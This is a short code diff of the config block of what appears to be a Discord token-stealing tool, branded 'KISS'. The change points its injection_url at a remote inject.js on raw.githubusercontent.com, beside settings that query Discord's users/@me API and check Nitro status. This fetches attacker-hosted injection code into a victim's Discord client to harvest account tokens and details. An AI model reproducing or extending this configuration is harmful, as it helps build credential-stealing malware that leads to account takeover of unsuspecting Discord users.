@@ -14,7 +14,7 @@ const config = {
   embed_name: 'KISS', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1306601365551841280/1323322700198051842/eron4u.png?ex=677417cd&is=6772c64d&hm=48d85a280b517766e209ef117dfaf0256a15227e8473e3bf7add4be11dd5d6a7&'.replace(/ /g, '%20'), 
   embed_color: 8363488,
-  injection_url: 'inject.js', 
+  injection_url: 'https://raw.githubusercontent.com/eronforyou/kiss/refs/heads/main/inject.js', 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
